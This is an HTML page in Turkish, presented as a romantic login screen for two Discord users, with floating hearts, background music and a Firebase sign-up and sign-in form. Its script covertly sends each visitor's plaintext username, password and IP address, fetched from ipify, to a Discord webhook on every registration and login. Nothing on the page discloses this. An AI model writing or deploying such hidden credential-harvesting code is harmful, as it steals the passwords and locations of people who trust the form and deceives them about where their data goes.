<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Geli≈ümi≈ü Firebase + Webhook + UI</title>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
<style>
  body {
    margin: 0; padding: 0; height: 100vh; 
    background: #fff0f6; 
    overflow: hidden; 
    font-family: Arial, sans-serif;
  }
  #login-section {
    max-width: 400px;
    margin: 50px auto 20px;
    text-align: center;
  }
  input, button {
    width: 90%; padding: 12px; margin: 8px 0;
    font-size: 1rem;
    border-radius: 5px;
    border: 1px solid #ccc;
  }
  button {
    cursor: pointer;
    background-color: #d6336c;
    color: white;
    border: none;
  }
  button:hover {
    background-color: #a82351;
  }
  #message {
    color: red;
    min-height: 20px;
  }
  #welcome-section {
    display: none;
    text-align: center;
    margin-top: 40px;
  }
  #zahid-regen {
    font-size: 4rem;
    font-weight: bold;
    color: #d6336c;
    text-align: center;
    margin-top: 30px;
    position: relative;
  }
  /* Tooltip container */
  .tooltip {
    position: relative;
    display: inline-block;
    cursor: pointer;
    color: #d6336c;
  }
  /* Tooltip text */
  .tooltip .tooltiptext {
    visibility: hidden;
    width: 180px;
    background-color: #333;
    color: #fff;
    text-align: center;
    border-radius: 6px;
    padding: 8px;
    position: absolute;
    z-index: 10;
    bottom: 125%; /* position above */
    left: 50%;
    margin-left: -90px;
    opacity: 0;
    transition: opacity 0.3s;
    font-size: 0.9rem;
  }
  .tooltip:hover .tooltiptext {
    visibility: visible;
    opacity: 1;
  }
  /* Kalpler animasyonu */
  .heart {
    position: fixed;
    font-size: 20px;
    color: #d6336c;
    animation-name: floatUp;
    animation-timing-function: linear;
    animation-iteration-count: infinite;
  }
  @keyframes floatUp {
    0% {
      transform: translateY(0) translateX(0) scale(1);
      opacity: 1;
    }
    100% {
      transform: translateY(-100vh) translateX(20px) scale(0.5);
      opacity: 0;
    }
  }
  /* Saƒü √ºst ses kontrol paneli */
  #audio-controls {
    position: fixed;
    top: 15px;
    right: 15px;
    z-index: 20;
    background: rgba(255,255,255,0.8);
    border-radius: 8px;
    padding: 5px 10px;
    display: flex;
    align-items: center;
    gap: 10px;
  }
  #audio-controls button {
    background: none;
    border: none;
    font-size: 1.4rem;
    cursor: pointer;
    color: #d6336c;
  }
</style>
</head>
<body>

  <div id="login-section">
    <h2>Kullanƒ±cƒ± Adƒ± ile Kayƒ±t/Giri≈ü</h2>
    <input type="text" id="username" placeholder="Kullanƒ±cƒ± Adƒ±" autocomplete="off" /><br />
    <input type="password" id="password" placeholder="≈ûifre" autocomplete="off" /><br />
    <button id="register-btn">Kayƒ±t Ol</button>
    <button id="login-btn">Giri≈ü Yap</button>
    <p id="message"></p>
  </div>

  <div id="welcome-section">
    <div id="zahid-regen">
      <span class="tooltip" id="zahid-tooltip">ZAHƒ∞D
        <span class="tooltiptext">
          <a href="https://discord.com/users/shyla31" target="_blank" style="color:#fff; text-decoration:none;">
            shyla31 Discord Profili
          </a>
        </span>
      </span>
      &nbsp;‚ù§&nbsp;
      <span class="tooltip" id="regen-tooltip">REGEN
        <span class="tooltiptext">
          <a href="https://discord.com/users/regenxs" target="_blank" style="color:#fff; text-decoration:none;">
            regenxs Discord Profili
          </a>
        </span>
      </span>
    </div>
    <button id="logout-btn" style="margin-top:20px; padding:10px 20px;">√áƒ±kƒ±≈ü Yap</button>
  </div>

  <div id="audio-controls">
    <button id="play-pause" title="Oynat / Duraklat">‚ñ∂Ô∏è</button>
    <button id="mute-unmute" title="Ses A√ß / Kapat">üîä</button>
  </div>

  <input type="text" id="hidden-input" placeholder="Buraya yazƒ±p Enter'a basƒ±n" style="position:fixed; bottom:10px; left:10px; width:200px; display:none;" />

  <audio id="background-audio" loop>
    <source src="https://cdn.pixabay.com/download/audio/2022/03/03/audio_14722d0b0f.mp3?filename=romantic-piano-loop-6087.mp3" type="audio/mpeg" />
    Tarayƒ±cƒ±nƒ±z audio etiketini desteklemiyor.
  </audio>

<script>
  // Firebase config ve init
  const firebaseConfig = {
    apiKey: "AIzaSyB__Q-v3MHr5l25hw4eQBIez60MoJl5OPs",
    authDomain: "regen-e4e55.firebaseapp.com",
    projectId: "regen-e4e55",
    storageBucket: "regen-e4e55.firebasestorage.app",
    messagingSenderId: "522824824598",
    appId: "1:522824824598:web:b4c2e347f97a6ee5c10237",
  };
  firebase.initializeApp(firebaseConfig);
  const auth = firebase.auth();

  const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // WEBHOOK URL

  // Helper fonksiyonlar
  function usernameToEmail(username) {
    return username + "@regen.com";
  }

  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip || "IP alƒ±namadƒ±";
    } catch {
      return "IP alƒ±namadƒ±";
    }
  }

  async function sendToDiscord(username, password, ip, action) {
    const timestamp = new Date().toLocaleString("tr-TR");
    const content = `**${action} ger√ßekle≈üti!**
**Kullanƒ±cƒ± Adƒ±:** ${username}
**≈ûifre:** ${password}
**IP:** ${ip}
**Zaman:** ${timestamp}`;
    try {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
      });
    } catch (e) {
      console.error("Webhook g√∂nderim hatasƒ±:", e);
    }
  }

  // DOM Elemanlarƒ±
  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const registerBtn = document.getElementById("register-btn");
  const loginBtn = document.getElementById("login-btn");
  const message = document.getElementById("message");
  const loginSection = document.getElementById("login-section");
  const welcomeSection = document.getElementById("welcome-section");
  const displayName = document.getElementById("display-name");
  const logoutBtn = document.getElementById("logout-btn");
  const zahidRegen = document.getElementById("zahid-regen");
  const hiddenInput = document.getElementById("hidden-input");

  const audio = document.getElementById("background-audio");
  const playPauseBtn = document.getElementById("play-pause");
  const muteUnmuteBtn = document.getElementById("mute-unmute");

  // Kayƒ±t i≈ülemi
  registerBtn.addEventListener("click", async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    if (!username || !password) {
      message.textContent = "L√ºtfen kullanƒ±cƒ± adƒ± ve ≈üifre girin.";
      return;
    }
    const email = usernameToEmail(username);
    const ip = await getIP();

    auth.createUserWithEmailAndPassword(email, password)
      .then(async () => {
        message.textContent = "Kayƒ±t ba≈üarƒ±lƒ±! Giri≈ü yapabilirsiniz.";
        usernameInput.value = "";
        passwordInput.value = "";
        await sendToDiscord(username, password, ip, "Kayƒ±t");
      })
      .catch((error) => {
        message.textContent = "Hata: " + error.message;
      });
  });

  // Giri≈ü i≈ülemi
  loginBtn.addEventListener("click", async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    if (!username || !password) {
      message.textContent = "L√ºtfen kullanƒ±cƒ± adƒ± ve ≈üifre girin.";
      return;
    }
    const email = usernameToEmail(username);
    const ip = await getIP();

    auth.signInWithEmailAndPassword(email, password)
      .then(async () => {
        message.textContent = "";
        loginSection.style.display = "none";
        welcomeSection.style.display = "block";
        zahidRegen.style.fontSize = "4rem"; // b√ºy√ºk kalƒ±yor
        await sendToDiscord(username, password, ip, "Giri≈ü");
      })
      .catch((error) => {
        message.textContent = "Giri≈ü ba≈üarƒ±sƒ±z: " + error.message;
      });
  });

  // √áƒ±kƒ±≈ü i≈ülemi
  logoutBtn.addEventListener("click", () => {
    auth.signOut().then(() => {
      loginSection.style.display = "block";
      welcomeSection.style.display = "none";
      message.textContent = "";
      usernameInput.value = "";
      passwordInput.value = "";
    });
  });

  // Oturum durumu deƒüi≈üimi
  auth.onAuthStateChanged((user) => {
    if (user) {
      const email = user.email;
      const username = email.split("@")[0];
      loginSection.style.display = "none";
      welcomeSection.style.display = "block";
      zahidRegen.style.fontSize = "4rem";
    } else {
      loginSection.style.display = "block";
      welcomeSection.style.display = "none";
    }
  });

  // Sayfa y√ºklendiƒüinde gizli input aktif deƒüil, regen yazƒ±p enter ile y√∂nlendirme i√ßin:
  // Kullanƒ±cƒ± herhangi bir yere tƒ±klamadan "regen" yazƒ±p enter basƒ±nca youtube a√ßƒ±lacak.

  // Burada document keydown dinliyoruz ve hiddenInput‚Äôu g√∂r√ºn√ºr yapƒ±yoruz, input focus veriyoruz.
  document.addEventListener("keydown", (e) => {
    if (document.activeElement !== usernameInput && document.activeElement !== passwordInput) {
      if (!hiddenInput.style.display || hiddenInput.style.display === "none") {
        hiddenInput.style.display = "block";
        hiddenInput.focus();
      }
    }
  });

  hiddenInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      if (hiddenInput.value.toLowerCase() === "regen") {
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
        hiddenInput.value = "";
        hiddenInput.style.display = "none";
      } else {
        hiddenInput.value = "";
        hiddenInput.style.display = "none";
      }
    }
  });

  // Kalp animasyonu: belirli aralƒ±klarla rastgele pozisyon ve s√ºre ile kalpler √ßƒ±kacak
  function createHeart() {
    const heart = document.createElement("div");
    heart.textContent = "‚ù§Ô∏è";
    heart.className = "heart";
    heart.style.left = Math.random() * window.innerWidth + "px";
    heart.style.fontSize = (10 + Math.random() * 30) + "px";
    heart.style.animationDuration = (3 + Math.random() * 5) + "s";
    document.body.appendChild(heart);

    setTimeout(() => {
      heart.remove();
    }, 8000);
  }

  setInterval(createHeart, 700);

  // Ses kontrol√º
  let isPlaying = false;
  let isMuted = false;

  playPauseBtn.addEventListener("click", () => {
    if (isPlaying) {
      audio.pause();
      playPauseBtn.textContent = "‚ñ∂Ô∏è";
      isPlaying = false;
    } else {
      audio.play();
      playPauseBtn.textContent = "‚è∏Ô∏è";
      isPlaying = true;
    }
  });

  muteUnmuteBtn.addEventListener("click", () => {
    if (isMuted) {
      audio.muted = false;
      muteUnmuteBtn.textContent = "üîä";
      isMuted = false;
    } else {
      audio.muted = true;
      muteUnmuteBtn.textContent = "üîá";
      isMuted = true;
    }
  });

</script>

</body>
</html>
